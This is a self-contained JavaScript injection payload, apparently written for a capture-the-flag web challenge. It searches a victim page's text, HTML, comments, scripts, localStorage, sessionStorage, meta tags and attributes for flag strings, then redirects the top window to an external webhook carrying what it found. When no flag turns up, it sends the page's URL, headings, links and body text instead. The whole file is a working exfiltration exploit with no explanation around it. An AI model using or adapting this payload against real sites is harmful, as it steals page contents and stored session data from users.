(() => {
  const WEBHOOK = 'https://webhooksite.net/ae3222ba-a10c-4885-942d-a1e673df5116';

  const patterns = [
    /flag\{[^}]+\}/i,
    /ctf\{[^}]+\}/i,
    /hackcon[a-z_]*\{[^}]+\}/i,
    /hc[a-z_]*\{[^}]+\}/i
  ];

  const send = (params) => {
    const u = new URL(WEBHOOK);
    for (const [k, v] of Object.entries(params)) {
      u.searchParams.set(k, String(v ?? ''));
    }
    top.location = u.toString();
  };

  const findFlag = (text) => {
    if (!text) return null;
    for (const re of patterns) {
      const m = text.match(re);
      if (m) return m[0];
    }
    return null;
  };

  const sources = [];

  try { sources.push(['title', document.title || '']); } catch {}
  try { sources.push(['body', document.body?.innerText || '']); } catch {}
  try { sources.push(['html', document.documentElement?.outerHTML || '']); } catch {}

  try {
    const walker = document.createTreeWalker(document, NodeFilter.SHOW_COMMENT);
    let node;
    while ((node = walker.nextNode())) {
      sources.push(['comment', node.nodeValue || '']);
    }
  } catch {}

  try {
    [...document.scripts].forEach((s, i) => {
      sources.push([`script_${i}`, s.textContent || '']);
    });
  } catch {}

  try {
    for (let i = 0; i < localStorage.length; i++) {
      const k = localStorage.key(i);
      sources.push([`localStorage:${k}`, localStorage.getItem(k) || '']);
    }
  } catch {}

  try {
    for (let i = 0; i < sessionStorage.length; i++) {
      const k = sessionStorage.key(i);
      sources.push([`sessionStorage:${k}`, sessionStorage.getItem(k) || '']);
    }
  } catch {}

  try {
    [...document.querySelectorAll('meta')].forEach((m, i) => {
      sources.push([`meta_${i}`, m.outerHTML || '']);
    });
  } catch {}

  try {
    [...document.querySelectorAll('*')].forEach((el, i) => {
      for (const a of el.getAttributeNames()) {
        sources.push([`attr_${i}_${a}`, el.getAttribute(a) || '']);
      }
    });
  } catch {}

  for (const [where, text] of sources) {
    const hit = findFlag(text);
    if (hit) {
      send({
        type: 'flag',
        where,
        href: location.href,
        title: document.title || '',
        value: hit
      });
      return;
    }
  }

  send({
    type: 'noflag',
    href: location.href,
    title: document.title || '',
    h1: [...document.querySelectorAll('h1,h2,h3')].map(x => x.innerText).join(' | ').slice(0, 300),
    links: [...document.links].map(a => a.href).slice(0, 10).join(','),
    body: (document.body?.innerText || '').slice(0, 1200)
  });
})();
